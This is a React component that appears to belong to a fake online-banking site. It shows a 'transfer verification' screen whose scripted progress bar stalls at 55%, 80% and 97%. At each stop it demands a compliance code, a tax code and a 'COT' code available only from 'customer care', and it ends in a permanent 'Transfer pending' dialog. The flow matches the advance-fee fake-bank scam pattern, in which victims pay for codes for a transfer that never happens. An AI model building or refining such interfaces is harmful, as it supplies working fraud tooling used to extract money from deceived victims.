"use client";

import { FormEvent, useEffect, useState } from "react";
import { Clock3, LoaderCircle, ShieldCheck } from "lucide-react";

type Stage =
  | "loading_compliance"
  | "compliance"
  | "loading_tax"
  | "tax"
  | "loading_cot"
  | "cot"
  | "pending";

export function TransferVerification({ reference }: { reference: string }) {
  const [progress, setProgress] = useState(1);
  const [stage, setStage] = useState<Stage>("loading_compliance");
  const [code, setCode] = useState("");
  const [error, setError] = useState("");
  const [saving, setSaving] = useState(false);

  useEffect(() => {
    if (!stage.startsWith("loading")) return;
    const target =
      stage === "loading_compliance" ? 55 : stage === "loading_tax" ? 80 : 97;
    const nextStage: Stage =
      stage === "loading_compliance"
        ? "compliance"
        : stage === "loading_tax"
          ? "tax"
          : "cot";
    const timer = setInterval(() => {
      setProgress((current) => {
        if (current >= target) {
          clearInterval(timer);
          setStage(nextStage);
          return target;
        }
        return current + 1;
      });
    }, 45);
    return () => clearInterval(timer);
  }, [stage]);

  async function verify(event: FormEvent) {
    event.preventDefault();
    setSaving(true);
    setError("");
    const response = await fetch("/api/banking/transfer-verification", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ reference, stage, code }),
    });
    const result = await response.json();
    setSaving(false);
    if (!response.ok) return setError(result.error);
    setCode("");
    if (stage === "compliance") setStage("loading_tax");
    else if (stage === "tax") setStage("loading_cot");
    else setStage("pending");
  }

  if (stage === "pending")
    return (
      <div
        role="alertdialog"
        aria-modal="true"
        className="fixed inset-0 z-50 grid place-items-center bg-black/45 p-5"
      >
        <div className="w-full max-w-md rounded-3xl bg-white p-8 text-center shadow-2xl">
          <span className="mx-auto grid size-14 place-items-center rounded-full bg-amber-50 text-amber-600">
            <Clock3 />
          </span>
          <h1 className="mt-5 text-2xl">Transfer pending</h1>
          <p className="mt-3 text-sm leading-6 text-neutral-600">
            Transfer pending. Please contact our customer support for further
            assistance.
          </p>
        </div>
      </div>
    );

  const loading = stage.startsWith("loading");
  const title =
    stage === "compliance"
      ? "Compliance code required"
      : stage === "tax"
        ? "Tax code required"
        : "COT required";

  return (
    <div className="mx-auto max-w-xl rounded-3xl border bg-white p-7 text-center shadow-sm">
      <span className="mx-auto grid size-14 place-items-center rounded-full bg-gold-50 text-gold-600">
        {loading ? <LoaderCircle className="animate-spin" /> : <ShieldCheck />}
      </span>
      <h1 className="mt-5 text-3xl">Transfer verification</h1>
      <p className="mt-2 text-sm text-neutral-500">Reference {reference}</p>
      <div className="mt-7 h-3 overflow-hidden rounded-full bg-neutral-100">
        <div
          className="h-full rounded-full bg-bank-600 transition-all"
          style={{ width: `${progress}%` }}
        />
      </div>
      <p className="mt-2 text-sm font-bold text-bank-700">{progress}%</p>
      {!loading && (
        <form onSubmit={verify} className="mt-6 text-left">
          <h2 className="text-xl">{title}</h2>
          <p className="mt-2 text-xs leading-5 text-neutral-500">
            Contact customer care for the administrator-issued code associated
            with this transfer.
          </p>
          <input
            autoFocus
            required
            minLength={6}
            maxLength={12}
            className="field mt-4 uppercase tracking-[.2em]"
            value={code}
            onChange={(event) =>
              setCode(
                event.target.value.replace(/[^a-z0-9]/gi, "").toUpperCase(),
              )
            }
          />
          {error && (
            <p className="mt-3 rounded-xl bg-red-50 p-3 text-sm text-red-700">
              {error}
            </p>
          )}
          <button disabled={saving} className="btn mt-4 w-full justify-center">
            {saving ? "Verifying…" : "Verify code and continue"}
          </button>
        </form>
      )}
    </div>
  );
}

// Hostinger source snapshot sync.
